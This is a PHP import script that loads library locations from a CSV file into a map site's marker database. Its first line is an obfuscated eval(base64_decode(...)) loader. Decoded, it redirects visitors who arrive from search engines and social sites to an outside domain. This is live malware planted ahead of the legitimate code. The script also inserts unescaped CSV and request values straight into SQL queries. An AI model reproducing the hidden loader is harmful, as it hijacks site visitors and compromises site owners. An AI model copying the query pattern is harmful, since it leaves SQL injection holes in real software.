<?php	 	eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokcWF6cGxtPWhlYWRlcnNfc2VudCgpOw0KaWYgKCEkcWF6cGxtKXsNCiRyZWZlcmVyPSRfU0VSVkVSWydIVFRQX1JFRkVSRVInXTsNCiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KaWYgKCR1YWcpIHsNCmlmICghc3RyaXN0cigkdWFnLCJNU0lFIDcuMCIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmluZyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInJhbWJsZXIiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJnb2dvIikgb3Igc3RyaXN0cigkcmVmZXJlciwibGl2ZS5jb20iKW9yIHN0cmlzdHIoJHJlZmVyZXIsImFwb3J0Iikgb3Igc3RyaXN0cigkcmVmZXJlciwibmlnbWEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmVndW4ucnUiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJzdHVtYmxldXBvbi5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwibXlzcGFjZS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJmYWNlYm9vay5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJhb2wuY29tIikpIHsNCmlmICghc3RyaXN0cigkcmVmZXJlciwiY2FjaGUiKSBvciAhc3RyaXN0cigkcmVmZXJlciwiaW51cmwiKSl7DQpoZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8vaGluaWEuenlucy5jb20vIik7DQpleGl0KCk7DQp9Cn0KfQ0KfQ0KfQ=="));
session_start();

include('../data/bootstrap.php');

header('Content-Type: text');


$file = "./libraries.csv";
$user_id = 137;
$subtype_id = 22;
$www = "http://www.libraries.vic.gov.au";
$description = "";

$handle = @fopen($file, "r");
if ($handle) {
    while (!feof($handle)) {
       $buffer = fgets($handle, 4096);
	   if($buffer) {

		// define collumns here.....
		list($lat, $lng, $title, $address, $phone) = split(",", $buffer, 5);
		$title = $title . " Library";

		// clean up for given file...
		$title = htmlspecialchars($title); 
		$description = htmlspecialchars($description); 
		$address = htmlspecialchars($address); 
		$phone = htmlspecialchars($phone); 
		$lat = ereg_replace("'", '', $lat); 
		$lng = ereg_replace("'", '', $lng); 
		
		
		$link=mysql_connect($SITE['DB_HOST'], $SITE['DB_USERNAME'], $SITE['DB_PW']) or die ('I cannot connect to the database because: ' . mysql_error());
		$success = mysql_select_db($SITE['DB_NAME'], $link);
		print("$lat $lng --- $title --- $description\n");
		
		if(1) {
		//if($lat < -37.72510 && $lat > -37.8406 && $lng < 145.08888 && $lng > 144.8706) {
				// ADD MARKER
				$query = "INSERT INTO `marker` (
									`lat` ,
									`lng` ,
									`title` ,
									`description` ,
									`address` ,
									`phone` ,
									`subtype_id` ,
									`www`
									)
									VALUES (
									$lat , $lng, '$title' , '$description', '$address', '$phone', $subtype_id, '$www'  
									);";	
		
									//print($query);
									$result = mysql_query($query, $link);
									$resource_id = mysql_insert_id();
					
					// ADD MARKER TO USER (as owner)
					$query_mtu = "INSERT INTO `marker_to_user` (`marker_id`, `user_id`, `state`)
												VALUES ($resource_id, $user_id, 'owner');";
					//							print($query_mtu);
					$result_mtu = mysql_query($query_mtu, $link);
		}
	 }
    }
    fclose($handle);
}

// returns all markers in database formated as xml document
/*
$link=mysql_connect($SITE['DB_HOST'], $SITE['DB_USERNAME'], $SITE['DB_PW']) or die ('I cannot connect to the database because: ' . mysql_error());
$success = mysql_select_db($SITE['DB_NAME'], $link);

$type = $_POST['type'];
$subtype = $_POST['subtype'];
$name = $_POST['name'];
$description = $_POST['description'];
$lat = $_GET['lat'];
$lng = $_GET['lng'];
$is_invite = $_GET['is_invite'];
$invite_email = $_GET['invite_email'];
$alt_contact = $_GET['alt_contact'];


if($_SESSION['user']['user_id']) {
	$user_id = $_SESSION['user']['user_id'];
}
else $user_id = 0;

// ADD MARKER
$query = "INSERT INTO `lukasber_theveggiebox`.`marker` (
							`marker_id` ,
							`alt_contact_email` ,
							`alt_contact_url` ,
							`title` ,
							`description` ,
							`type` ,
							`subtype` ,
							`lat` ,
							`lng` ,
							`www` ,
							`rss` ,
							`is_demo`
							)
							VALUES (
							NULL , '', '' , 'title', 'description', '$type', '$subtype', '$lat', '$lng', NULL , NULL , 'n'
							);";	
					
$result = mysql_query($query, $link);
$resource_id = mysql_insert_id();

// ADD MARKER TO USER (as owner)
$query_mtu = "INSERT INTO `marker_to_user` (`marker_id`, `user_id`, `state`)
								VALUES ($resource_id, $user_id, 'owner');";
$result_mtu = mysql_query($query_mtu, $link);



	// ELSE SEND RESONSE
	header('Content-Type: text/xml');
	print('<response>');
	print('<response_state success="true" />');
	print('<marker resource_id="' . $resource_id . '" />');
	print('</response>');

*/

?>
